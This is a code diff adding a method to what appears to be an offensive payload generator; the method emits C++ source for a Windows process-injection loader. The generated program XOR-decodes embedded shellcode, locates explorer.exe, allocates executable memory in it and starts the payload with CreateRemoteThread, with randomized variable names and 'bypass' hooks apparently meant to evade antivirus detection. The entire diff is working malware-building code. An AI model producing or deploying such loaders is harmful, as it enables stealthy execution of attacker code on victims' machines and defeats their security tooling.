@@ -620,6 +620,105 @@ if ({bypass_calls}) {{
             encoded_shellcode=encoded_shellcode
         )
 
+    def process_injection_template(self, bypass_functions, bypass_calls, bypass_imports):
+        xor_var = self.make_random_str()
+        xor_key = self.make_random_str()
+        shellcode_var = self.make_random_str()
+        counter_var = self.make_random_str()
+        increment_var = self.make_random_str()
+        encoded_shellcode = self.open_shellcode(xor_key)
+
+        return """#include <windows.h>
+#include <tlhelp32.h>
+#include <string>
+{bypass_imports}
+using namespace std;
+
+{bypass_functions}
+
+DWORD {find_process_id}()
+{{
+    HANDLE {h_process_snap};
+    PROCESSENTRY32 {pe32};
+    DWORD {result} = 0;
+    const char *{process_name} = "{process}";
+
+    {h_process_snap} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    
+    if (INVALID_HANDLE_VALUE == {h_process_snap}) {{
+        return(FALSE);
+    }}
+
+    {pe32}.dwSize = sizeof(PROCESSENTRY32);
+    if (!Process32First({h_process_snap}, &{pe32}))
+    {{
+        CloseHandle({h_process_snap});
+        return(0);
+    }}
+
+    do
+    {{
+        if (0 == strcmp({process_name}, {pe32}.szExeFile))
+        {{
+            {result} = {pe32}.th32ProcessID;
+            break;
+        }}
+    }} while (Process32Next({h_process_snap}, &{pe32}));
+
+    CloseHandle({h_process_snap});
+
+    return {result};
+}}
+
+int main(int argc, char **argv) {{
+    if ({bypass_calls}) {{
+        char {xor_var}[] = "{xor_key}";
+        char {shellcode_var}[] = "{encoded_shellcode}";
+        char {shellcode}[sizeof {shellcode_var}];
+        
+        int {counter_var} = 0;
+        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
+            if({counter_var} == sizeof {xor_var} -1) {{
+                {counter_var}=0;
+            }}
+            {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
+            {counter_var}++;
+        }}
+        
+        HANDLE {process_handle};
+        HANDLE {remote_thread};
+        PVOID {remote_buffer};
+    
+        {process_handle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {find_process_id}());
+        {remote_buffer} = VirtualAllocEx({process_handle}, NULL, sizeof {shellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory({process_handle}, {remote_buffer}, {shellcode}, sizeof {shellcode}, NULL);
+        {remote_thread} = CreateRemoteThread({process_handle}, NULL, 0, (LPTHREAD_START_ROUTINE){remote_buffer}, NULL, 0, NULL);
+        CloseHandle({process_handle});
+    }}
+    return 0;
+}} 
+        """.format(
+            bypass_imports=bypass_imports,
+            bypass_functions=bypass_functions,
+            find_process_id=self.make_random_str(),
+            h_process_snap=self.make_random_str(),
+            pe32=self.make_random_str(),
+            result=self.make_random_str(),
+            process="explorer.exe",  # TODO
+            process_name="explorer", # TODO
+            bypass_calls=bypass_calls,
+            xor_var=xor_var,
+            xor_key=xor_key,
+            shellcode_var=shellcode_var,
+            encoded_shellcode=encoded_shellcode,
+            shellcode=self.make_random_str(),
+            counter_var=counter_var,
+            increment_var=increment_var,
+            process_handle=self.make_random_str(),
+            remote_thread=self.make_random_str(),
+            remote_buffer=self.make_random_str(),
+        )
+
     @staticmethod
     def ask_for_payload():
         selected_answer = None
